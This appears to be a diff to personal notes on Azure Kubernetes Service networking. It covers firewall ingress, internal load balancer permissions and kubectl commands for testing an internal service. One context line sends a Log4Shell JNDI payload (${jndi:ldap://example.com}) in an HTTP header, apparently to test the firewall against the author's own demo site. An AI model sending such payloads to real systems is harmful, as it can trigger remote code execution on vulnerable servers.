@@ -210,6 +210,11 @@ curl -m1 https://aksdemo.klaud.online/?q=1 -H 'X-Log: ${jndi:ldap://example.com}
 
 Ingress https://learn.microsoft.com/en-us/azure/firewall/protect-azure-kubernetes-service
 
+https://learn.microsoft.com/en-us/azure/aks/internal-lb?tabs=set-service-annotations
+Kubernetes Service managed identity does not have persmissions for VNET in other RG
+https://stackoverflow.com/questions/68117424/aks-getting-unauthorize-error-while-trying-to-create-load-balancer
+give Network Contributor to VNET to Kubertenes Service?
+
 ```shell
 kubectl apply -f - <<EOF
 apiVersion: v1
@@ -225,7 +230,14 @@ spec:
   selector:
     app: web
 EOF
-
+kubectl describe svc internal-web
+kubectl get svc
 kubectl delete svc internal-web
 kubectl get svc
+
+LBIP=$(kubectl get svc internal-web -o json | jq -r .status.loadBalancer.ingress[0].ip)
+kubectl run -it --rm --image=nginx mycurl -- curl -vvv "http://$LBIP"; 
+kubectl delete pod/mycurl
+kubectl run -it --rm --image=nginx mycurl -- curl ip.iol.cz/ip/
+
 ```
